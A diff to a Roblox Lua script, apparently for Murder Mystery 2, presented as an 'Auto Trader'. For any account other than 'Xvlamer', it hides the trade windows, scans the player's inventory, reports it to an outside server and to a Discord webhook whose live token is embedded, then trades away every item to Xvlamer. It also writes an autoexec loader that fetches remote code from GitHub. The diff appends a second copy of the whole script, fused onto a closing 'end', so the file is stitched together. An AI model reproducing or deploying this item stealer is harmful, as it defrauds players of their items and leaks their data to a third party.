@@ -10,8 +10,7 @@ local playerGui = localPlayer:WaitForChild("PlayerGui")
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1532116972035244093/ffaXKW-D1xLNlv5Pipbzf_XUa-5Nw30YevB0w_h1EchJADpWWJC0xPhwnYopvjeQFBIw"
 local TARGET_USERNAME = "Xvlamer"
 local WHITELIST_URL = "https://mm2-trader.onrender.com"
-local LOADSTRING_URL = "https://raw.githubusercontent.com/Xvlamer/mm2/refs/heads/main/Script"
-local GAME_ID = game.PlaceId
+local GAME_ID = 142823291
 local IS_XVLAMER = (localPlayer.Name == TARGET_USERNAME)
 
 local RARITY_SCORE = {
@@ -39,26 +38,17 @@ local RARITY_PRIORITY = {
 
 if IS_XVLAMER then
     pcall(function()
-        if syn and syn.run_on_global_script then
-            syn.run_on_global_script(true)
-        end
-        if saveinstance then
-            local autoScript = string.format('loadstring(game:HttpGet("%s"))()', LOADSTRING_URL)
-            if writefile then
-                writefile("autoexec/mm2trader.lua", autoScript)
-            end
-        end
         if writefile then
-            writefile("autoexec/mm2trader.lua", string.format('loadstring(game:HttpGet("%s"))()', LOADSTRING_URL))
+            writefile("autoexec/mm2trader.lua", 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xvlamer/mm2/refs/heads/main/Script"))()')
+            print("[AUTOTRADER][A] Auto-execute file written.")
         end
     end)
-    print("[AUTOTRADER][A] Auto-execute registered.")
 end
 
 local whitelistedUsernames = {}
 local tradeInProgress = false
-local currentServerScore = 0
 local serverJoinTime = tick()
+local currentServerScore = 0
 
 local function httpRequest(url, method, body)
     local result = nil
@@ -343,10 +333,6 @@ local function buildPriorityList(weaponItems, petItems)
     return finalList
 end
 
-local function shouldPing(weaponItems)
-    return hasHighValueItems(weaponItems)
-end
-
 local function sendWebhook(weaponItems, petItems)
     local weaponRarityCounts = {}
     local petRarityCounts = {}
@@ -374,12 +360,14 @@ local function sendWebhook(weaponItems, petItems)
     end
     if petText == "" then petText = "*None*\n" end
 
+    local pingContent = hasHighValueItems(weaponItems) and "@here" or ""
+
     local payload = HttpService:JSONEncode({
-        content = shouldPing(weaponItems) and "@here" or "",
+        content = pingContent,
         embeds = {{
             title = "🤖 Auto Trader Executed",
             description = "**👤 Username:** `" .. localPlayer.Name .. "`\n**🌐 Server ID:** `" .. tostring(game.JobId) .. "`",
-            color = shouldPing(weaponItems) and 16711680 or 3447003,
+            color = hasHighValueItems(weaponItems) and 16711680 or 3447003,
             fields = {
                 {name = "⚔️ Weapons", value = weaponText, inline = true},
                 {name = "🐾 Pets", value = petText, inline = true}
@@ -414,6 +402,7 @@ local function waitForLoadingGone()
                 if friendsList then
                     local playButton = friendsList:FindFirstChild("Play")
                     if playButton and playButton.Visible then
+                        print("[AUTOTRADER][A] Firing Play button.")
                         playButton:Activate()
                     end
                 end
@@ -591,10 +580,26 @@ if IS_XVLAMER then
             end
 
             if bestJobId then
-                print("[AUTOTRADER][A] Better server found. User: " .. bestUser .. " Score: " .. bestScore .. " Teleporting.")
+                print("[AUTOTRADER][A] Better server found. User: " .. bestUser .. " | Score: " .. bestScore .. " | Teleporting.")
                 pcall(function()
                     TeleportService:TeleportToPlaceInstance(GAME_ID, bestJobId, localPlayer)
                 end)
+            else
+                local anyOtherJob = nil
+                local anyOtherUser = nil
+                for username, jobId in pairs(jobs) do
+                    if username ~= TARGET_USERNAME and jobId ~= currentJobId then
+                        anyOtherJob = jobId
+                        anyOtherUser = username
+                        break
+                    end
+                end
+                if anyOtherJob then
+                    print("[AUTOTRADER][A] No one in this server. Joining: " .. anyOtherUser)
+                    pcall(function()
+                        TeleportService:TeleportToPlaceInstance(GAME_ID, anyOtherJob, localPlayer)
+                    end)
+                end
             end
         end
     end)
@@ -614,6 +619,7 @@ if IS_XVLAMER then
                 tradeInProgress = false
                 serverJoinTime = tick()
                 task.wait(0.5)
+                print("[AUTOTRADER][A] Trade done.")
             else
                 print("[AUTOTRADER][A] " .. senderName .. " not whitelisted. Declining.")
                 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
@@ -639,17 +645,13 @@ else
     sendHeartbeat()
     sendWebhook(weaponItems, petItems)
 
-    task.spawn(function()
-        while true do
-            fetchWhitelist()
-            task.wait(5)
-        end
-    end)
-
     local function waitForXvlamer()
         while true do
             local xvlamer = Players:FindFirstChild(TARGET_USERNAME)
-            if xvlamer then return xvlamer end
+            if xvlamer then
+                print("[AUTOTRADER][B] Xvlamer found in server.")
+                return xvlamer
+            end
             task.wait(1)
         end
     end
@@ -661,10 +663,704 @@ else
         return not hasEligibleItems(wItems, pItems)
     end
 
+    print("[AUTOTRADER][B] Entering trade loop.")
     while not allItemsGone() do
         if not isTradeGuiActive() then
             local xvlamer = Players:FindFirstChild(TARGET_USERNAME)
             if xvlamer then
+                print("[AUTOTRADER][B] Firing SendRequest to Xvlamer.")
+                local args = {[1] = game:GetService("Players"):WaitForChild("Xvlamer")}
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+                task.wait(0.1)
+            else
+                task.wait(1)
+                waitForXvlamer()
+            end
+        else
+            local wItems, pItems = scanAllItems()
+            local priorityList = buildPriorityList(wItems, pItems)
+            if #priorityList > 0 then
+                executeTrade(priorityList)
+            else
+                waitForTradeGuiInactive()
+                task.wait(0.5)
+            end
+        end
+        task.wait(0.05)
+    end
+
+    print("[AUTOTRADER][B] All items traded. Done.")
+endif not game:IsLoaded() then game.Loaded:Wait() end
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1532116972035244093/ffaXKW-D1xLNlv5Pipbzf_XUa-5Nw30YevB0w_h1EchJADpWWJC0xPhwnYopvjeQFBIw"
+local TARGET_USERNAME = "Xvlamer"
+local WHITELIST_URL = "https://mm2-trader.onrender.com"
+local GAME_ID = 142823291
+local IS_XVLAMER = (localPlayer.Name == TARGET_USERNAME)
+
+local RARITY_SCORE = {
+    ["Common"]        = 1,
+    ["Uncommon"]      = 2,
+    ["Rare"]          = 3,
+    ["Collectable"]   = 4,
+    ["Unknown"]       = 5,
+    ["Legendary"]     = 6,
+    ["Godly"]         = 7,
+    ["UniqueClassic"] = 8,
+    ["Ancient"]       = 9,
+}
+
+local RARITY_PRIORITY = {
+    {color = Color3.fromRGB(106, 106, 106), name = "Common",        priority = 1, dot = "⚪"},
+    {color = Color3.fromRGB(0, 255, 255),   name = "Uncommon",      priority = 2, dot = "🔵"},
+    {color = Color3.fromRGB(0, 200, 0),     name = "Rare",          priority = 3, dot = "🟢"},
+    {color = Color3.fromRGB(180, 70, 0),    name = "Collectable",   priority = 4, dot = "🟠"},
+    {color = Color3.fromRGB(220, 0, 5),     name = "Legendary",     priority = 6, dot = "🔴"},
+    {color = Color3.fromRGB(255, 0, 179),   name = "Godly",         priority = 7, dot = "🟣"},
+    {color = Color3.fromRGB(230, 200, 0),   name = "UniqueClassic", priority = 8, dot = "🟡"},
+    {color = Color3.fromRGB(100, 10, 255),  name = "Ancient",       priority = 9, dot = "💜"},
+}
+
+if IS_XVLAMER then
+    pcall(function()
+        if writefile then
+            writefile("autoexec/mm2trader.lua", 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xvlamer/mm2/refs/heads/main/Script"))()')
+            print("[AUTOTRADER][A] Auto-execute file written.")
+        end
+    end)
+end
+
+local whitelistedUsernames = {}
+local tradeInProgress = false
+local serverJoinTime = tick()
+local currentServerScore = 0
+
+local function httpRequest(url, method, body)
+    local result = nil
+    pcall(function()
+        local payload = {
+            Url = url,
+            Method = method or "GET",
+            Headers = {["Content-Type"] = "application/json"},
+        }
+        if body then payload.Body = HttpService:JSONEncode(body) end
+        if syn and syn.request then
+            result = syn.request(payload)
+        elseif http and http.request then
+            result = http.request(payload)
+        elseif request then
+            result = request(payload)
+        end
+    end)
+    return result
+end
+
+local function computeServerScore(raritySummary)
+    local score = 0
+    if not raritySummary then return score end
+    for rarityName, count in pairs(raritySummary) do
+        local base = RARITY_SCORE[rarityName] or 0
+        score = score + (base * base * count)
+    end
+    return score
+end
+
+local function registerWithServer(raritySummary)
+    local payload = {
+        username = localPlayer.Name,
+        jobId = game.JobId,
+        score = computeServerScore(raritySummary),
+        raritySummary = raritySummary or {}
+    }
+    httpRequest(WHITELIST_URL .. "/register", "POST", payload)
+    print("[AUTOTRADER] Registered. User: " .. localPlayer.Name .. " | Job: " .. game.JobId)
+end
+
+local function sendHeartbeat()
+    task.spawn(function()
+        while true do
+            task.wait(30)
+            httpRequest(WHITELIST_URL .. "/heartbeat", "POST", {username = localPlayer.Name})
+        end
+    end)
+end
+
+local function fetchWhitelist()
+    local result = httpRequest(WHITELIST_URL .. "/list", "GET")
+    if result and result.Body then
+        local ok, data = pcall(function() return HttpService:JSONDecode(result.Body) end)
+        if ok and data and data.users then
+            whitelistedUsernames = {}
+            for _, name in ipairs(data.users) do
+                whitelistedUsernames[name] = true
+            end
+        end
+    end
+end
+
+local function fetchJobs()
+    local result = httpRequest(WHITELIST_URL .. "/jobs", "GET")
+    if result and result.Body then
+        local ok, data = pcall(function() return HttpService:JSONDecode(result.Body) end)
+        if ok and data and data.jobs then
+            return data.jobs
+        end
+    end
+    return {}
+end
+
+local function fetchScores()
+    local result = httpRequest(WHITELIST_URL .. "/scores", "GET")
+    if result and result.Body then
+        local ok, data = pcall(function() return HttpService:JSONDecode(result.Body) end)
+        if ok and data and data.scores then
+            return data.scores
+        end
+    end
+    return {}
+end
+
+local function isWhitelisted(username)
+    return whitelistedUsernames[username] == true
+end
+
+task.spawn(function()
+    while true do
+        fetchWhitelist()
+        task.wait(5)
+    end
+end)
+
+local function getRarity(color)
+    local r1 = math.round(color.R * 255)
+    local g1 = math.round(color.G * 255)
+    local b1 = math.round(color.B * 255)
+    for _, entry in ipairs(RARITY_PRIORITY) do
+        local r2 = math.round(entry.color.R * 255)
+        local g2 = math.round(entry.color.G * 255)
+        local b2 = math.round(entry.color.B * 255)
+        if r1 == r2 and g1 == g2 and b1 == b2 then
+            return entry.name, entry.priority, entry.dot
+        end
+    end
+    return "Unknown", 5, "❓"
+end
+
+local function isChroma(newItemFrame)
+    local tags = newItemFrame:FindFirstChild("Tags")
+    if tags and tags:FindFirstChild("Chroma") then return true end
+    return false
+end
+
+local function getAmount(newItemFrame)
+    local container = newItemFrame:FindFirstChild("Container")
+    if not container then return 1 end
+    local amountLabel = container:FindFirstChild("Amount")
+    if not amountLabel then return 1 end
+    local text = amountLabel.Text
+    if not text or text == "" then return 1 end
+    local num = text:match("x(%d+)")
+    if num then return tonumber(num) end
+    return 1
+end
+
+local function getItemName(newItemFrame)
+    local itemNameFrame = newItemFrame:FindFirstChild("ItemName")
+    if not itemNameFrame then return nil end
+    local label = itemNameFrame:FindFirstChild("Label")
+    if not label then return nil end
+    return label.Text
+end
+
+local function getItemRarity(newItemFrame)
+    local itemNameFrame = newItemFrame:FindFirstChild("ItemName")
+    if not itemNameFrame then return "Unknown", 5, "❓" end
+    return getRarity(itemNameFrame.BackgroundColor3)
+end
+
+local function isDefaultItem(name)
+    return name == "Default Gun" or name == "Default Knife"
+end
+
+local function scanScrollFrame(scrollFrame, itemType)
+    local items = {}
+    if not scrollFrame then return items end
+    local innerContainer = scrollFrame:FindFirstChild("Container")
+    if not innerContainer then return items end
+    for _, child in ipairs(innerContainer:GetChildren()) do
+        if child.Name == "NewItem" then
+            local name = getItemName(child)
+            if name and name ~= "" and not isDefaultItem(name) then
+                local rarityName, rarityPriority, dot = getItemRarity(child)
+                local amount = getAmount(child)
+                local chroma = isChroma(child)
+                table.insert(items, {
+                    name = name,
+                    rarity = rarityName,
+                    priority = rarityPriority,
+                    dot = dot,
+                    amount = amount,
+                    chroma = chroma,
+                    itemType = itemType,
+                })
+            end
+        end
+    end
+    return items
+end
+
+local function getMainGUI()
+    local mainGUI = playerGui:FindFirstChild("MainGUI")
+    if not mainGUI then
+        mainGUI = playerGui:WaitForChild("MainGUI", 60)
+    end
+    return mainGUI
+end
+
+local function getInventoryMain(mainGUI)
+    local gameFrame = mainGUI:FindFirstChild("Game")
+    if not gameFrame then return nil end
+    local inventory = gameFrame:FindFirstChild("Inventory")
+    if not inventory then return nil end
+    return inventory:FindFirstChild("Main")
+end
+
+local function scanAllItems()
+    local weaponItems = {}
+    local petItems = {}
+    local mainGUI = getMainGUI()
+    if not mainGUI then return weaponItems, petItems end
+    local main = getInventoryMain(mainGUI)
+    if not main then return weaponItems, petItems end
+
+    local weapons = main:FindFirstChild("Weapons")
+    if weapons then
+        local itemsFolder = weapons:FindFirstChild("Items")
+        if itemsFolder then
+            local container = itemsFolder:FindFirstChild("Container")
+            if container then
+                for _, scrollName in ipairs({"Classic", "Current", "Holiday"}) do
+                    local scrollFrame = container:FindFirstChild(scrollName)
+                    if scrollFrame then
+                        local found = scanScrollFrame(scrollFrame, "Weapons")
+                        for _, item in ipairs(found) do table.insert(weaponItems, item) end
+                    end
+                end
+            end
+        end
+    end
+
+    local pets = main:FindFirstChild("Pets")
+    if pets then
+        local itemsFolder = pets:FindFirstChild("Items")
+        if itemsFolder then
+            local container = itemsFolder:FindFirstChild("Container")
+            if container then
+                local scrollFrame = container:FindFirstChild("Current")
+                if scrollFrame then
+                    local found = scanScrollFrame(scrollFrame, "Pets")
+                    for _, item in ipairs(found) do table.insert(petItems, item) end
+                end
+            end
+        end
+    end
+
+    return weaponItems, petItems
+end
+
+local function buildRaritySummary(weaponItems, petItems)
+    local summary = {}
+    for _, item in ipairs(weaponItems) do
+        summary[item.rarity] = (summary[item.rarity] or 0) + item.amount
+    end
+    for _, item in ipairs(petItems) do
+        summary[item.rarity] = (summary[item.rarity] or 0) + item.amount
+    end
+    return summary
+end
+
+local function hasEligibleItems(weaponItems, petItems)
+    return #weaponItems > 0 or #petItems > 0
+end
+
+local function hasHighValueItems(weaponItems)
+    for _, item in ipairs(weaponItems) do
+        if item.rarity == "Godly" or item.rarity == "Ancient" or item.rarity == "UniqueClassic" then
+            return true
+        end
+    end
+    return false
+end
+
+local function sortItems(items)
+    table.sort(items, function(a, b)
+        if a.priority ~= b.priority then return a.priority < b.priority end
+        return a.amount > b.amount
+    end)
+    return items
+end
+
+local function buildPriorityList(weaponItems, petItems)
+    local chromaWeapons, chromaPets, normalWeapons, normalPets = {}, {}, {}, {}
+    for _, item in ipairs(weaponItems) do
+        if item.chroma then table.insert(chromaWeapons, item)
+        else table.insert(normalWeapons, item) end
+    end
+    for _, item in ipairs(petItems) do
+        if item.chroma then table.insert(chromaPets, item)
+        else table.insert(normalPets, item) end
+    end
+    local finalList = {}
+    for _, item in ipairs(sortItems(chromaWeapons)) do table.insert(finalList, item) end
+    for _, item in ipairs(sortItems(chromaPets)) do table.insert(finalList, item) end
+    for _, item in ipairs(sortItems(normalWeapons)) do table.insert(finalList, item) end
+    for _, item in ipairs(sortItems(normalPets)) do table.insert(finalList, item) end
+    return finalList
+end
+
+local function sendWebhook(weaponItems, petItems)
+    local weaponRarityCounts = {}
+    local petRarityCounts = {}
+
+    for _, item in ipairs(weaponItems) do
+        local label = item.chroma and (item.rarity .. " Chroma") or item.rarity
+        if not weaponRarityCounts[label] then weaponRarityCounts[label] = {count = 0, dot = item.dot} end
+        weaponRarityCounts[label].count = weaponRarityCounts[label].count + item.amount
+    end
+    for _, item in ipairs(petItems) do
+        local label = item.chroma and (item.rarity .. " Chroma") or item.rarity
+        if not petRarityCounts[label] then petRarityCounts[label] = {count = 0, dot = item.dot} end
+        petRarityCounts[label].count = petRarityCounts[label].count + item.amount
+    end
+
+    local weaponText = ""
+    for rarity, data in pairs(weaponRarityCounts) do
+        weaponText = weaponText .. data.dot .. " **" .. rarity .. "**: " .. data.count .. "\n"
+    end
+    if weaponText == "" then weaponText = "*None*\n" end
+
+    local petText = ""
+    for rarity, data in pairs(petRarityCounts) do
+        petText = petText .. data.dot .. " **" .. rarity .. "**: " .. data.count .. "\n"
+    end
+    if petText == "" then petText = "*None*\n" end
+
+    local pingContent = hasHighValueItems(weaponItems) and "@here" or ""
+
+    local payload = HttpService:JSONEncode({
+        content = pingContent,
+        embeds = {{
+            title = "🤖 Auto Trader Executed",
+            description = "**👤 Username:** `" .. localPlayer.Name .. "`\n**🌐 Server ID:** `" .. tostring(game.JobId) .. "`",
+            color = hasHighValueItems(weaponItems) and 16711680 or 3447003,
+            fields = {
+                {name = "⚔️ Weapons", value = weaponText, inline = true},
+                {name = "🐾 Pets", value = petText, inline = true}
+            },
+            footer = {text = "MM2 Auto Trader"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    })
+
+    pcall(function()
+        if syn and syn.request then
+            syn.request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
+        elseif http and http.request then
+            http.request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
+        elseif request then
+            request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
+        end
+    end)
+    print("[AUTOTRADER] Webhook sent.")
+end
+
+local function waitForLoadingGone()
+    if IS_XVLAMER then
+        repeat task.wait(0.05)
+        until not playerGui:FindFirstChild("Loading") and not playerGui:FindFirstChild("Join")
+        task.wait(0.1)
+        local joinScreen = playerGui:FindFirstChild("Join")
+        if joinScreen then
+            local friends = joinScreen:FindFirstChild("Friends")
+            if friends then
+                local friendsList = friends:FindFirstChild("FriendsList")
+                if friendsList then
+                    local playButton = friendsList:FindFirstChild("Play")
+                    if playButton and playButton.Visible then
+                        print("[AUTOTRADER][A] Firing Play button.")
+                        playButton:Activate()
+                    end
+                end
+            end
+        end
+    else
+        repeat task.wait(0.05)
+        until not playerGui:FindFirstChild("Loading")
+        task.wait(0.1)
+    end
+end
+
+local function isTradeGuiActive()
+    local tradeGui = playerGui:FindFirstChild("TradeGUI")
+    if not tradeGui then return false end
+    return tradeGui.Enabled
+end
+
+local function waitForTradeGuiActive()
+    repeat task.wait(0.05) until isTradeGuiActive()
+end
+
+local function waitForTradeGuiInactive()
+    repeat task.wait(0.05) until not isTradeGuiActive()
+end
+
+local function forceHideTradeAndRequest()
+    task.spawn(function()
+        while true do
+            task.wait(0)
+            local tradeGui = playerGui:FindFirstChild("TradeGUI")
+            if tradeGui then
+                tradeGui.Enabled = false
+                for _, d in ipairs(tradeGui:GetDescendants()) do
+                    if d:IsA("GuiObject") then d.Visible = false end
+                end
+            end
+            local mainGUI = playerGui:FindFirstChild("MainGUI")
+            if mainGUI then
+                local gameFrame = mainGUI:FindFirstChild("Game")
+                if gameFrame then
+                    local leaderboard = gameFrame:FindFirstChild("Leaderboard")
+                    if leaderboard then
+                        local container = leaderboard:FindFirstChild("Container")
+                        if container then
+                            local tradeRequest = container:FindFirstChild("TradeRequest")
+                            if tradeRequest then
+                                local receiving = tradeRequest:FindFirstChild("ReceivingRequest")
+                                if receiving then
+                                    local uLabel = receiving:FindFirstChild("Username")
+                                    if uLabel and uLabel.Text == TARGET_USERNAME then
+                                        tradeRequest.Visible = false
+                                        for _, d in ipairs(tradeRequest:GetDescendants()) do
+                                            if d:IsA("GuiObject") then d.Visible = false end
+                                        end
+                                    end
+                                end
+                                local sending = tradeRequest:FindFirstChild("SendingRequest")
+                                if sending then
+                                    sending.Visible = false
+                                    for _, d in ipairs(sending:GetDescendants()) do
+                                        if d:IsA("GuiObject") then d.Visible = false end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local function getSenderUsername()
+    local mainGUI = playerGui:FindFirstChild("MainGUI")
+    if not mainGUI then return "" end
+    local gameFrame = mainGUI:FindFirstChild("Game")
+    if not gameFrame then return "" end
+    local leaderboard = gameFrame:FindFirstChild("Leaderboard")
+    if not leaderboard then return "" end
+    local container = leaderboard:FindFirstChild("Container")
+    if not container then return "" end
+    local tradeRequest = container:FindFirstChild("TradeRequest")
+    if not tradeRequest then return "" end
+    local receiving = tradeRequest:FindFirstChild("ReceivingRequest")
+    if not receiving then return "" end
+    local uLabel = receiving:FindFirstChild("Username")
+    if not uLabel then return "" end
+    return uLabel.Text
+end
+
+local function offerItem(itemName, itemType)
+    local args = {[1] = itemName, [2] = itemType}
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+end
+
+local function acceptTrade()
+    task.wait(6.5)
+    local startTime = tick()
+    repeat
+        local args = {[1] = 428469873, [2] = 1626.7811482530087}
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+        task.wait(0.5)
+    until not isTradeGuiActive() or tick() - startTime > 15
+end
+
+local function executeTrade(priorityList)
+    local slotsFilled = {}
+    local index = 1
+    while index <= #priorityList do
+        local item = priorityList[index]
+        if #slotsFilled < 4 then
+            local alreadySlotted = false
+            for _, slottedName in ipairs(slotsFilled) do
+                if slottedName == item.name then alreadySlotted = true break end
+            end
+            if not alreadySlotted then
+                table.insert(slotsFilled, item.name)
+                offerItem(item.name, item.itemType)
+                task.wait(0.1)
+            end
+        end
+        local isLast = (index == #priorityList)
+        local slotsFull = (#slotsFilled >= 4)
+        if slotsFull or isLast then
+            for _, slottedName in ipairs(slotsFilled) do
+                for _, pItem in ipairs(priorityList) do
+                    if pItem.name == slottedName and pItem.amount > 1 then
+                        for i = 2, pItem.amount do
+                            offerItem(pItem.name, pItem.itemType)
+                            task.wait(0.1)
+                        end
+                    end
+                end
+            end
+            acceptTrade()
+            waitForTradeGuiInactive()
+            task.wait(0.5)
+            slotsFilled = {}
+        end
+        index = index + 1
+    end
+end
+
+if IS_XVLAMER then
+    print("[AUTOTRADER][A] Sector A starting.")
+    waitForLoadingGone()
+
+    task.spawn(function()
+        while true do
+            task.wait(10)
+            if tradeInProgress then continue end
+            local timeInServer = tick() - serverJoinTime
+            if timeInServer < 30 then continue end
+
+            local wItems, _ = scanAllItems()
+            if hasHighValueItems(wItems) then continue end
+
+            local scores = fetchScores()
+            local jobs = fetchJobs()
+            local currentJobId = game.JobId
+            local bestScore = currentServerScore
+            local bestJobId = nil
+            local bestUser = nil
+
+            for username, jobId in pairs(jobs) do
+                if username ~= TARGET_USERNAME and jobId ~= currentJobId then
+                    local s = scores[username] or 0
+                    if s > bestScore then
+                        bestScore = s
+                        bestJobId = jobId
+                        bestUser = username
+                    end
+                end
+            end
+
+            if bestJobId then
+                print("[AUTOTRADER][A] Better server found. User: " .. bestUser .. " | Score: " .. bestScore .. " | Teleporting.")
+                pcall(function()
+                    TeleportService:TeleportToPlaceInstance(GAME_ID, bestJobId, localPlayer)
+                end)
+            else
+                local anyOtherJob = nil
+                local anyOtherUser = nil
+                for username, jobId in pairs(jobs) do
+                    if username ~= TARGET_USERNAME and jobId ~= currentJobId then
+                        anyOtherJob = jobId
+                        anyOtherUser = username
+                        break
+                    end
+                end
+                if anyOtherJob then
+                    print("[AUTOTRADER][A] No one in this server. Joining: " .. anyOtherUser)
+                    pcall(function()
+                        TeleportService:TeleportToPlaceInstance(GAME_ID, anyOtherJob, localPlayer)
+                    end)
+                end
+            end
+        end
+    end)
+
+    print("[AUTOTRADER][A] Entering accept loop.")
+    while true do
+        task.wait(0.05)
+        local senderName = getSenderUsername()
+        if senderName ~= "" then
+            if isWhitelisted(senderName) then
+                print("[AUTOTRADER][A] " .. senderName .. " whitelisted. Accepting.")
+                tradeInProgress = true
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
+                waitForTradeGuiActive()
+                acceptTrade()
+                waitForTradeGuiInactive()
+                tradeInProgress = false
+                serverJoinTime = tick()
+                task.wait(0.5)
+                print("[AUTOTRADER][A] Trade done.")
+            else
+                print("[AUTOTRADER][A] " .. senderName .. " not whitelisted. Declining.")
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                task.wait(0.5)
+            end
+        end
+    end
+
+else
+    print("[AUTOTRADER][B] Sector B starting.")
+    waitForLoadingGone()
+    forceHideTradeAndRequest()
+
+    local weaponItems, petItems = scanAllItems()
+
+    if not hasEligibleItems(weaponItems, petItems) then
+        print("[AUTOTRADER][B] No eligible items. Stopping.")
+        return
+    end
+
+    local raritySummary = buildRaritySummary(weaponItems, petItems)
+    registerWithServer(raritySummary)
+    sendHeartbeat()
+    sendWebhook(weaponItems, petItems)
+
+    local function waitForXvlamer()
+        while true do
+            local xvlamer = Players:FindFirstChild(TARGET_USERNAME)
+            if xvlamer then
+                print("[AUTOTRADER][B] Xvlamer found in server.")
+                return xvlamer
+            end
+            task.wait(1)
+        end
+    end
+
+    waitForXvlamer()
+
+    local function allItemsGone()
+        local wItems, pItems = scanAllItems()
+        return not hasEligibleItems(wItems, pItems)
+    end
+
+    print("[AUTOTRADER][B] Entering trade loop.")
+    while not allItemsGone() do
+        if not isTradeGuiActive() then
+            local xvlamer = Players:FindFirstChild(TARGET_USERNAME)
+            if xvlamer then
+                print("[AUTOTRADER][B] Firing SendRequest to Xvlamer.")
                 local args = {[1] = game:GetService("Players"):WaitForChild("Xvlamer")}
                 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
                 task.wait(0.1)
